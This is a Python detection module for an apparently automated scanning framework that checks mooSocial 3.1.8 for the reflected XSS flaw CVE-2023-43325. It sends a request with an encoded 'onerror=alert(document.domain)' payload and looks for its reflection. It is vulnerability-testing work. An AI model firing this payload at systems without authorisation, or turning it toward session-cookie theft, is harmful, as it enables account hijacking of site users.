#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A reflected cross-site scripting (XSS) vulnerability exisits in the data[redirect_url] parameter on user login."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MooSocial 3.1.8 - Cross-Site Scripting Detection',
        'description': "A reflected cross-site scripting (XSS) vulnerability exisits in the data[redirect_url] parameter on user login function of mooSocial v3.1.8 which allows attackers to steal user's session cookies and impersonate their account via a crafted URL.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xss', 'moosocial', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/ahrixia/CVE-2023-43325',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-43325',
            'https://moosocial.com/',
            'https://travel.moosocial.com/',
            'https://github.com/fkie-cad/nvd-json-data-feeds',
        ],
        'cve': 'CVE-2023-43325',
    }

    def run(self):
        r = self.http_request(method="GET", path='/users/test%22%3E%3Cimg%20src=a%20onerror=alert(document.domain)%3Etest', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('<img src=a onerror=alert(document.domain)>', 'mooSocial',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="MooSocial 3.1.8 - Cross-Site Scripting detected",
                path='/users/test%22%3E%3Cimg%20src=a%20onerror=alert(document.domain)%3Etest',
            )
            return True
        return False

